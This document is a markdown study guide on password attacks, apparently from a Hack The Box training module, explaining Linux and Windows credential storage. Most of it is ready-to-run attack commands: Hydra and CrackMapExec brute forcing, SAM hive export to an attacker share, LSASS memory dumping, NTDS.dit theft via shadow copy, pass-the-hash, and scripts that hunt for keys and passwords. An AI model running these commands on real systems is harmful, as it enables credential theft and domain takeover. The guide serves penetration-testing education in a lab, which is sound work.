# Password Attacks
- [Introduction](#introduction)
    - [Credential Storage in linux](#credential-storage-in-linux)
    - [Credential Storage in windows](#credential-storage-in-windows)
    - [John The Ripper](#john-the-ripper)
- [Remote Password Attacks](#remote-password-attacks)
    - [Network Services](#network-services)
    - [Password Mutations](#password-mutations)
    - [Password Reuse / Default Passwords](#password-reuse--default-passwords)
- [Windows Local Password Attacks](#windows-local-password-attacks)
    - [Attacking SAM](#attacking-sam)
        - [Copying SAM Registry Hives & Dumping Hashes](#copying-sam-registry-hives--dumping-hashes)
        - [Remote Dumping & LSA Secrets Considerations](#remote-dumping--lsa-secrets-considerations)
    - [Attacking LSASS](#attacking-lsass)
        - [Dumping LSASS Process Memory](#dumping-lsass-process-memory)
        - [Using Pypykatz to Extract Credentials](#using-pypykatz-to-extract-credentials)
    - [Attacking Active Directory & NTDS.dit](#attacking-active-directory--ntdsdit)
        - [Dictionary Attacks against AD accounts](#dictionary-attacks-against-ad-accounts)
        - [Capturing NTDS.dit](#capturing-ntdsdit)
    - [Credential Hunting in Windows](#credential-hunting-in-windows)
- [Linux Local Password Attacks](#linux-local-password-attacks)
    - [Credential Hunting in Linux](#credential-hunting-in-linux)



## Introduction
### Credential Storage in linux 
- Encrypted passwords in `/etc/shadow`
- Cryptographic hash methods: 

|ID	|Cryptographic Hash Algorithm|
|---|----------------------------|
|`$1$`|	MD5|
|`$2a$`|	Blowfish|
|`$5$`|	SHA-256|
|`$6$`|	SHA-512|
|`$sha1$`|	SHA1crypt|
|`$y$`|	Yescrypt|
|`$gy$`|	Gost-yescrypt|
|`$7$`|	Scrypt|



```
cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

- The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file.

> [!WARNING]
> Password empty field means that we can log in with the username without entering a password.

### Credential Storage in windows 
- Winlogon is a trusted process responsible for managing security-related user interactions. These include:

    - Launching LogonUI to enter passwords at login
    - Changing passwords
    - Locking and unlocking the workstation

- Each interactive logon session creates a separate instance of the Winlogon service.

- Authentication packages are the Dynamic-Link Libraries (DLLs) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

- **Authentication Flow**
    - Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.

- **Local Security Authority Subsystem Service (LSASS)**: is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`.
    - This service is responsible for: 
        - The local system security policy
        - User authentication
        - Sending security audit logs to the Event log

> [!NOTE]       
> LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. 

|Authentication Packages|	Description|
|-----------------------|--------------|
|Lsasrv.dll|	The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|Msv1_0.dll|	Authentication package for local machine logons that don't require custom authentication.|
|Samsrv.dll|	The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|Kerberos.dll|	Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|Netlogon.dll|	Network-based logon service.|
|Ntdsa.dll|	This library is used to create new records and folders in the Windows registry.|

- **Security Account Manager (SAM)**
    - SAM is a database file in Windows operating systems that stores users' passwords
    - It can be used to authenticate local and remote users.
    - User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash.
    - This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM.


### John The Ripper
- **Cracking Modes**
    - Single crack Mode: `john --format=<hash_type> <hash or hash_file>` , `--wordlist` option
    - Wordlist Mode: `john --wordlist=<wordlist_file>,<wordlist_file>,<wordlist_file> --rules <hash_file>`
    - Incremental Mode



## Remote Password Attacks
### Network Services
#### WinRM
- Using CrackMapExec: 
    - `crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>` e.g. `crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
    - The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user
- Using Evil-WinRM: 
    - `evil-winrm -i <target-IP> -u <username> -p <password>` e.g. `evil-winrm -i 10.129.42.197 -u user -p password`

#### SSH 
- Using Hydra:
    - `hydra -L user.list -P password.list ssh://10.129.42.197`

#### Remote Desktop Protocol (RDP)
- Using Hydra:
    - `hydra -L user.list -P password.list rdp://10.129.42.197`

#### SMB
- Using Hydra:
    - `hydra -L user.list -P password.list smb://10.129.42.197`
- Using auxiliary(scanner/smb/smb_login) in Metasploit

- Interact with it using crackmapexec or smbclient 
    - `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`
    - `smbclient -U user \\\\10.129.42.197\\SHARENAME`

### Password Mutations
#### Hashcat
- How Hashcat mutates words?

|Function|	Description|
|---------|------------|
|:|	Do nothing.|
|l|	Lowercase all letters.|
|u|	Uppercase all letters.|
|c|	Capitalize the first letter and lowercase others.|
|sXY|	Replace all instances of X with Y.|
|$!|	Add the exclamation character at the end.|

- Generating Rule-base wordlist: `hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`
- Hashcat Existing Rules: `ls /usr/share/hashcat/rules/`, One of the most used rules is `best64.rule`.


#### CeWL

- It scans potential words from the company's website and save them in a separate list.
- We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password.
- We can specify some parameters: 
    - Depth to spider (`-d`)
    - Minimum length of the word (`-m`)
    - Storage of the found words in lowercase (`--lowercase`)
    - Store the results (`-w`)
- e.g. `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`

### Password Reuse / Default Passwords
- [Default Credential cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [Default router username and password list](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

## Windows Local Password Attacks
### Attacking SAM
#### Copying SAM Registry Hives & Dumping Hashes
- There are three registry hives that we can copy if we have local admin access on the target.Here is a brief description of each in the table below:

|Registry Hive|	Description|
|-------------|------------|
|hklm\sam|	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|hklm\system|	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|hklm\security|	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
- **Steps**
    1. We can create backups of these hives using the `reg.exe` utility
        - `C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save`
        - `C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save`
        - `C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save`
    2. Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share: `move sam.save \\10.10.15.16\CompData`

    3. Dumping Hashes with Impacket's secretsdump.py: `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
    4. Start cracking hashes using Hashcat 
        1. Adding nthashes to a .txt File
        2. Running hashcat against NT hashes `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`

> [!TIP]
> [Other techniques to dump hashes](https://attack.mitre.org/techniques/T1003/002/) 

#### Remote Dumping & LSA Secrets Considerations

- With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network
- Dumping LSA Secrets Remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
- Dumping SAM Remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

### Attacking LSASS

![lsass diagram](/images/lsassexe_diagram.png)

- Upon initial logon, LSASS will:
    - Cache credentials locally in memory
    - Create access tokens
    - Enforce security policies
    - Write to Windows security log

#### Dumping LSASS Process Memory
- **Memory Dump methods:**
    1. Task Manager Method: 
    ![Task manager dump](/images/taskmanagerdump.png)
    - A file called lsass.DMP is created and saved in: `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
    2. Rundll32.exe & Comsvcs.dll Method: 
        1. Finding LSASS PID in cmd or PowerShell:
            - From cmd, We can issue the command `tasklist /svc` and find lsass.exe and its process ID in the PID field
            - From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the Id field.
        2. Creating lsass.dmp using PowerShell:
            - `PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`

#### Using Pypykatz to Extract Credentials

- Use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file.
- Pypykatz is an implementation of Mimikatz written entirely in Python.
- Running Pypykatz:
    - `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
    
### Attacking Active Directory & NTDS.dit
#### Dictionary Attacks against AD accounts

> [!TIP] 
> We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.

- We can use an automated list generator such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.


- Launching the Attack with CrackMapExec `abdeonix@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`

> [!WARNING]
> If the admins configured an account lockout policy, this attack could lock out the account that we are targeting.

#### Capturing NTDS.dit
- NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. 

- **Steps**
    1. We can connect to a target DC using the credentials we captured. `abdeonix@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`

    2. Checking Local Group Membership `*Evil-WinRM* PS C:\> net localgroup`
    3. Checking User Account Privileges including Domain `*Evil-WinRM* PS C:\> net user <USER>` e.g. `*Evil-WinRM* PS C:\> net user bwilliamson`
    4. You are lucky if the account has Domain administrator rights. Creating Shadow Copy of C: `*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:`
    5. Copying NTDS.dit from the VSS `*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
    6. Transferring NTDS.dit to Attack Host `*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData `

- A Faster Method: Using CrackMapExec to Capture NTDS.dit `abdeonix@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds`

- Pass-the-Hash Considerations (If we have failed to crack the hash) 
    - `abdeonix@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`


### Credential Hunting in Windows

- Here are some helpful key terms we can use that can help us discover some credentials:
```
Passwords	      Passphrases	        Keys
Username	      User account	        Creds
Users	          Passkeys	            Passphrases
configuration     dbcredential	        dbpassword
pwd	              Login	                Credentials
```

- We can use [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. 

- Running Lazagne `C:\Users\bob\Desktop> start lazagne.exe all`. We can include the option -vv to study what it is doing in the background.

- Using findstr `C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

## Linux Local Password Attacks
### Credential Hunting in Linux
- Here are some helpful key terms we can use that can help us discover some credentials:

|Files|	History|	Memory|	Key-Rings|
|:----|:-------|:---------|:---------|
|Configs|	Logs|	Cache|	Browser stored credentials|
|Databases|	Command-line History|	In-memory Processing|
|Notes|			
|Scripts|			
|Source codes|			
|Cronjobs|			
|SSH Keys|

```bash
# Configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Credentials in Configuration Files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# Databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# Cronjobs
cat /etc/crontab
ls -la /etc/cron.*/

# SSH Private Keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# SSH Public Keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

# History
tail -n5 /home/*/.bash*

# Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# LaZagne
sudo python2.7 laZagne.py all

```